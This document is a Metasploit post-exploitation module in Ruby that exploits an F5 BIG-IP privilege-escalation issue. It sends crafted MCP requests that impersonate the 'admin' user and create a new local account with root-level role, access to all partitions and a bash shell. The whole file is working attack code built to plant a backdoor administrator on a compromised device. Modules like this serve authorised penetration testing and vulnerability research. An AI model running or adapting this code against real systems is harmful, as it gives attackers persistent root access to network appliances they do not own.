##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System
  include Msf::Post::Linux::F5

  def initialize(info = {})
    super(update_info(info,
      'Name'         => 'F5 Big-IP Create Admin User',
      'Description'  => %q{
        This creates a local user with a username/password and root-level
        privileges. Note that a root-level account is not required to do this,
        which makes it a privilege escalation issue.

        Adapted from https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-privesc.rb
      },
      'License'      => MSF_LICENSE,
      'Author'       =>
        [
          'Ron Bowes'
        ],
      'Platform'     => ['linux'],
      'SessionTypes' => ['shell', 'meterpreter']
    ))

    register_options([
      OptString.new('USERNAME', [true, 'Username to create']),
      OptString.new('PASSWORD', [true, 'Password for the user, either plaintext or as a \'$6$\'-prefixed crypted password', 'Password1']),
    ])
  end

  def run
    username = datastore['USERNAME']
    password = datastore['PASSWORD']

    unless password =~ /^$/
      vprint_status("Hashing the password")
      salt = "$6$#{Rex::Text.rand_text_alphanumeric(8)}$"
      password = password.crypt(salt)

      if !password || password.empty?
        fail_with(Failure::BadConfig, 'Failed to crypt the password')
      end
    end

    # These requests have to go in a single "session", which, to us, is
    # a single packet (since we don't have AF_UNIX sockets)
    result = mcp_send_recv([
      # Authenticate as "admin"
      mcp_build('user_authenticated', 'structure', [
        mcp_build('user_authenticated_name', 'string', 'admin')
      ]),

      # Start transaction
      mcp_build('start_transaction', 'structure', [
        mcp_build('start_transaction_load_type', 'ulong', 0)
      ]),

      # Create the role mapping
      mcp_build('create', 'structure', [
        mcp_build('user_role_partition', 'structure', [
          mcp_build('user_role_partition_user', 'string', username),
          mcp_build('user_role_partition_role', 'ulong',  0),
          mcp_build('user_role_partition_partition', 'string', '[All]'),
        ])
      ]),

      # Create the userdb entry
      mcp_build('create', 'structure', [
        mcp_build('userdb_entry', 'structure', [
          mcp_build('userdb_entry_name',         'string', username),
          mcp_build('userdb_entry_partition_id', 'string', 'Common'),
          mcp_build('userdb_entry_is_system',    'ulong',  0),
          mcp_build('userdb_entry_shell',        'string', '/bin/bash'),
          mcp_build('userdb_entry_is_crypted',   'ulong',  1),
          mcp_build('userdb_entry_passwd',       'string', password),
        ])
      ]),

      # Finish the transaction
      mcp_build('end_transaction', 'structure', [])
    ])

    # Handle errors
    if result.nil?
      fail_with(Failure::Unknown, 'Request to mcp appeared to fail')
    end

    # The only result we really care about is an error
    error_returned = false
    result.each do |r|
      result = mcp_get_single(r, 'result')
      result_code = mcp_get_single(result, 'result_code')

      # If there's no code or it's zero, just ignore it
      if result_code.nil? || result_code == 0
        next
      end

      # If we're here, an error was returned!
      error_returned = true

      # Otherwise, try and get result_message
      result_message = mcp_get_single(result, 'result_message')
      if result_message.nil?
        print_warning("mcp query returned a non-zero result (#{result_code}), but no error message")
      else
        print_warning("mcp query returned an error message: #{result_message} (code: #{result_code})")
      end
    end

    # Let them know if it likely worked
    if !error_returned
      print_good("Service didn't return an error, so user was likely created!")
    end
  end
end
